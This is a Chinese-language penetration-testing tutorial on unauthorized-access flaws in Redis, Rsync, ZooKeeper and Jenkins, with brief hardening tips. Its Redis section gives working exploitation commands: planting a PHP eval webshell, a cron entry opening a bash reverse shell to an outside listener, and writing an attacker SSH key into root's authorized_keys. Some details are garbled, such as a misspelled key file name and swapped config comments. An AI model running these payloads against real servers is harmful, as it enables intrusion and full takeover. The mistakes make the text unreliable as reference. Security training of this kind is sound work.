未授权访问

由于缺乏认证机制、授权页面存在缺陷或配置不当等原因导致可以直接访问系统后台或服务的漏洞

通过未授权访问漏洞，通常可以获取系统的敏感信息，甚至可以直接读取数据库、执行系统命令

Redis未授权访问

为了保证效率，Redis的数据都是缓存在内存中,兵周期性地把更新的数据写入磁盘或者把修改操作写入到文件中,攻击这在未授权访问Redis的情况下可以随时执行save，利用这个操作，可以任意文件写入

默认端口 : 6379

  1. 使用 redis-cli 工具连接Redis服务
  2. 使用 config get dir 查看备份文件写入路径，若成功返回结果，则说明目标未开启认证，存在未授权访问
  3. 使用 config get dbfilename查看备份文件名
  4. Redis默认写入路径 /var/lib/redis，默认备份文件为dump.rdb
  1. 也可以使用nc直接连接redis
nc 192.168.204.137 6379

  1. redis环境搭建
// 安装配置环境
yum -y install gcc* tcl tcl-devel make

// 安装redis
wget http://download.redis.io/releases/redis-6.2.4.tar.gz
tar xzf redis-6.2.4.tar.gz
cd redis-6.2.4/src
make
make install PREFIX=/usr/local/redis

cd ../
cp redis.conf /etc

// 漏洞复现配置
vim /etc/redis.conf

# bind 127.0.0.1 // 打开配置文件把下面对应的注释掉（或者可以针对自己的ip进行bind）
protected-mode no // Redis默认不是以守护进程的方式运行，可以通过该配置项修改，使用yes启用守护进程，设置为no
daemonize no // 关闭保护模式

// 启动redis
/usr/local/redis/bin/redis-server /etc/redis.conf // 启动redis并载入刚刚修改过的redis配置文件

/usr/local/redis/bin/redis-cli shutdown // 关闭服务

写webshell

远程登录 redis

redis-cli -h 192.168.50.165 -p 6379

config set dir /var/www/html/ // 因为这里的环境没有这个目录，所以写在了 /tmp 目录中

config set dbfilename shell.php

set x "\r\n\r\n<?php @eval($_GET['x']);?>\r\n\r\n"

save

反弹shell

写入任务任务

set x "\n* * * * * /bin/bash -i>&/dev/tcp/192.168.50.129/12345 0>&1\n\n"

config set dir /var/spool/cron/

config set dbfilename root // 这里的文件名必须是用户名，要想获取root权限就设置为root

save

nc -lvvp 12345

因为靶机修改了mpy用户执行，所以会获取到mpy的权限，改成root就会获取root权限

ssh 写公钥

  1. kali生成公钥
ssh-keygen -t rsa // 默认情况下载用户家目录的.ssh目录下生成，这里的密码为 root

(echo "\n\n";cat /root/.ssh/id_rsa.pub)>/tmp/test.txt
cat /tmp/test.txt | redis-cli -h IP地址 -p 6379 -x set crackit
  1. 连接redis
redis-cli -h IP地址 -p 6379
  1. 配置ssh
config set dir /root/.ssh/
config set dbfilename autorized_keys
save
  1. ssh连接
ssh root@IP地址 -i ~/.ssh/.id_rsa

注意事项

  1. webshell写入可以参考上面的
  2. 反弹shell时写入的任务计划名称是以用户名命名的，想要获得谁的权限就把名字改成谁 [config set dbfilename 名字]
  3. ssh写公钥时保存的名字不需要加引号 [config set dbfilename autorized_keys] 这样就行了，不要给名字加引号，不然ssh连接失败

防御措施

针对以上安全缺陷，Redis3.2版本提出了新特性 Protected mode（保护模式）默认以redis用户启动，默认限制本机连接

vim /etc/redis/redis.conf

Jenkins未授权访问

Jekins是基于java开发的一款开元CI&CD软件，用于自动化各种任务，包括构建、测试、部署软件，作为一种持续集成工具，Jenkins多用于监控持续重复的工作，提供一个开放易用的软件平台

Rsync未授权访问

Rsync是一个远程数据同步工具,可以通过LAN/WAN快速同步多台主机间的文件，也可以同步本地硬盘中的不同目录

Rsync默认允许匿名访问，如果在配置文件中没有相关的用户认证以及文件授权，就会触发隐患，攻击者可以利用该漏洞下载于上传任意文件

默认端口 : 873

防御

  1. 配置hosts allow限制可访问的IP
  2. 配置auth users和secrets file指定链接时的用户名和密码
vim /etc/rsyncd.conf

[src]
path = /
comment = src path
hosts allow=192.168.1.1
auth users=test
secrets file=/etc/rsyncd.passwd

ZooKeeper未授权访问

ZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，是Google的Clubby一个开源的实现,是Hadoop和Hbase的重要组建，它是一个为分布式应用提供一致性服务的软件（功能包括 : 配置维护、域名服务、分布式同步、组服务等）

ZooKeeper安装部署之后默认情况下不需要任何身份验证，造成攻击者可以远程利用ZooKeeper通过服务器收集敏感信息或者在Zookeeper集群内进行破坏

默认端口 : 2181
